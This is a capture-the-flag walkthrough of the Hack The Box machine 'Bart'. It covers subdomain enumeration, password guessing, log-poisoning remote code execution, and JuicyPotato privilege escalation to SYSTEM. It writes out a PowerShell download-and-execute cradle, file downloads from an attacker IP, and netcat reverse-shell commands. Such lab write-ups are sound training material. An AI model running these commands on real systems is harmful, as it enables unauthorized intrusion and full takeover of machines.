# Bart [HTB](https://app.hackthebox.com/machines/Bart)
![bart-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/bart-01.png)


## Recon

After adding the target to my `/etc/hosts` file, i fire off an `nmap` scan:

```bash
nmap -sC -sV -A -p- bart.htb -oN nmap.result
```

![namp-res-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/nmap-res-02.png)

We have the following:

+ An IIS V10.0 on port 80.

It appears that the web server redirected `nmap` to a subdomain `forum.bart.htb`, lets add this subdomain
to `/etc/hosts` as well and take a look at this web server. 

![hosts-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/hosts-03.png)


### IIS Port 80

Lets open our browser and navigate towards the site at `http://forum.bart.htb`:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/site-04.png)

Looks legit. If we scroll down a bit we can see some employee information disclosure:

![employees-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/employees-05.png)

One of these employee's user account could be a potential entry point. Lets keep looking. We can check the backend tech 
with `Wappalyzer`: 

![wappalyzer-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/wappalyzer-06.png)

Looks like the backend is `WordPress 4.8.2`, we have a `MySQL` database, and `PHP` as well. Good to know.

All links on the site lead to the same home page, i wonder what else is on here, lets run a directory scan with `ffuf`: 

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://forum.bart.htb/FUZZ
```

This scan resulted in every directory returnning a `500` HHTP status code, if we filter it out with the 
`-fc 500` switch, the scan leads to nothing. 

Lets try subdomain enumeration with `wfuzz`:

```bash
wfuzz -c -f sub-fighter -w /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.bart.htb' --sc 200,202,204,301,307,403 -u 'http://bart.htb'
```

![wfuzz-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/wfuzz-07.png)

We found another subdomain, lets add it to `/etc/hosts`, and check it out:

![monitor-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/monitor-08.png)

An authintication portal. We dont have credentials at the moment, but we see a version number at the 
buttom. Lets search for any known exploits while running another directory scan againts this subdomain. 
This time i also included a file extension search. 

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://monitor.bart.htb/FUZZ -fc 500 -e .php,.apsx,.xml,.txt
```

I did find a possible CSRF vulnerability with PHP Server Monitor version 3.3.1 [here](https://packetstormsecurity.com/files/134144/PHP-Server-Monitor-3.1.1-Privilege-Escalation.html). This would have been nice, but we need to create a a pishing attack 
to get an admin to click the link, which is not the solution for a lab environment. 

Instead, the `ffuf` scan has found a couple of interesting files:

![ffuf-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/ffuf-09.png)

The `config.php` file is empty, but the `install.php` is active. Ive tried to go through the installation, accourding to the documintation, the wizard should have given us an option to setup an account, but it doesnt happen in our case. 

I've also tried brute forcing the login page, if we click the `Forgot password` link, we can enumerate 
valid usernames on the system. I found that `daniel` is a valid username, but i couldnt find his password. 

I've tried enumerating further with `gospider`, didnt help. I found a [github](https://github.com/phpservermon/phpservermon) that has all of the backend. I used this git page as a sitemap and looked in every file to find something interesting, but without success. 

At this point i spent a few hours on this box, and i had no leads on how to proceed. So i decided to 
go back to the original site, `forum.bart.htb`. Here, i tried enumerating with different tools, but 
without success. So i decided to take a look at the source code:

![harvey-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/harvey-10.png)

They wanted to include another user in the home page, but it broke the CSS:

![css-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/css-11.png)

If we use the password recovery mechanism, the username `harvey` will be validated:

![validate-usr-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/validate-usr-12.png)

So i decided to brute force this account, didnt work. So i decided to guess the password. My first guess 
was the last name of the user, `potter`. And indeed it worked:

![success-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/success-13.png)

Here, we see a single server being monitored. If we click on it, we discover another subdomain:

![subdomain-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/subdomain-14.png)

If we add this subdomain to our `/etc/hosts` once again and open it we get another login prompt:

![chat-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/chat-15.png)

The previous credentials dont work for this page. We have to go back to enumeration. 
I've tried directory busting, `gospider`, brute forcing, nothing worked, i spent a few hours here as well. 

So i searched online and found the [source code](https://github.com/magkopian/php-ajax-simple-chat/blob/master/simple_chat/login_form.php) of the project.

![project-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/project-16.png)

The `simple_chat` directory is the same one from our target. If we look inside, we see a `register.php` file:

![register-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/register-17.png)

If we try to open this file on our target we get a server error, but if we use `Burp` to intercept the 
request and the response we will see the following:

![intercept-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/intercept-18.png)

The server accepted our request, and redirected us to `register_form.php`, once the redirect is done, 
we get the server error. We can conclude from this that the `register.php` file is present on the server. 

Lets take a look at the source code for `register.php`:

![source-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/source-19.png)

Looks like the code is looking for the username and password fields to be passed in a `POST` request. 
So a registration request should look like this:

![reg-req-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/reg-req-20.png)

Notice how the redirect link changed? Lets try to login:

![login-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/login-21.png)

We are in! If we take a look at the comments, it appears that `bobby` here is worried about development
code being shared on the internal chat server. And on the surface we dont see any source code, let take 
a look at the HTML source code though, perhaps its there. 

![chat-src-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/chat-src-22.png)

This is the java script code for the `log` link at the chat page, it looks like its creating a log file.
Lets open this link:

`http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey`

![log-action-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/log-action-23.png)

Ok, not much here, lets check the `log.txt` file being passed as a parameter in the URL:

`http://internal-01.bart.htb/log/log.txt`

![log-file-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/log-file-24.png)

Interesting. Looks like each entry here has three fields, time and date, username, and the user-agent. 
What im thinking is that the `log` link in the chat server writes an antry into this file. We know from 
the source code that the username has been passed as a parameter, the date is probably calculated from
the server itself, and the user-agent is probably extracted from the HTTP request header.

Can we modify the username? lets try and send this URL:

`http://internal-01.bart.htb/log/log.php?filename=log.txt&username=htb` 

![mod-usr-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/mod-usr-25.png)

A 0? Its probably the status code of the operation. Lets see if an entry was written in the log file:

![log-file-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/log-file-24.png)

Nope, the log file was left uncahcnged. So a return code of `0` means the operation has failed. 
Okay, if we cant change the username, the only field we can try to control is the user-agent.

Lets send the following request: 

![user-agent-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/user-agent-26.png)

Lets check the log file:

![log=file-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/log-file-27.png)

There is it. Can we pass this to `log.php` instead of `log.txt` and have the PHP code executed? 

![inject-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/inject-28.png)

Lets check the response? 

![rce-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/rce-29.png)

So we can control the filename parameter, and we can execute commands via the user-agent field. 
Lets try to improve our `PHP` code by running command on the OS:

![rce-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/rce-30.png)


Lets send this request and see what happens:

![result-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/result-31.png)

So far so good, lets open the file and pass `whoami` to the script:

![whoami-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/whoami-32.png)


There it is, we have RCE. Lets setup a reverse shell. If we can execute commands on the OS, we can use 
a powershell command to download a powershell script from a remote host and execute it. 

```powershell
powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<kali-ip>/shell.ps1')"
```

First, lets host [nishang](https://github.com/samratashok/nishang/Shells)'s `Invoke-PowershelTcp.ps1` with a python server on our kali machine. Make sure to invoke the reverse shell at the buttom:

![nishang-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/nishang-33.png)


Now lets start a python server with:

```bash
python3 -m http.server 80
```

Start the listener with:

```bash
rlwrap nc -lnvp 443
```

Now we can execute by sending the follwing request to `log.php`:

![execute-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/execute-34.png)


Lets check the listener:

![shell-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/shell-35.png)

And finally, we get a shell. 


## Privilege Escalation

If we take a look at our user's privileges with:

```cmd
whoami /priv
```

![priv-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/privs-36.png)


We have the `Impersonate` privilege enabled, this means we can try a [potato attack](https://github.com/ohpe/juicy-potato). 

Download the potato attack and grab a copy of `/usr/share/windows-resources/binaries/nc.exe` to you current directory.
Then host a pyhton web server with:

```bash
python3 -m http.server 80
```

Now download both files to the target with:

```powershell
iwr -uri 'http://10.10.14.62/nc.exe' -outfile nc.exe
iwr -uri 'http://10.10.14.62/JuicyPotato.exe' -outfile jp.exe
```

Now, we need to find a valid CLSID for our target, lets check the system type:

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

![win10-pro-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/win10-pro-37.png)

Lets find a valid CLSID:

![clsid-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/clsid-38.png)


Lets start the listener on our kali with:

```bash
rlwrap nc -lnvp 9001
```

Now we should be ready to execute with:

```cmd
C:\inetpub\wwwroot\internal-01\log\jp.exe -l 9001 -p  C:\windows\system32\cmd.exe -a "/c C:\inetpub\wwwroot\internal-01\log\nc.exe -e cmd.exe 10.10.14.62 9001" -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
```

This should give you a shell as the system:

![root-39](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bart/img/root-39.png)
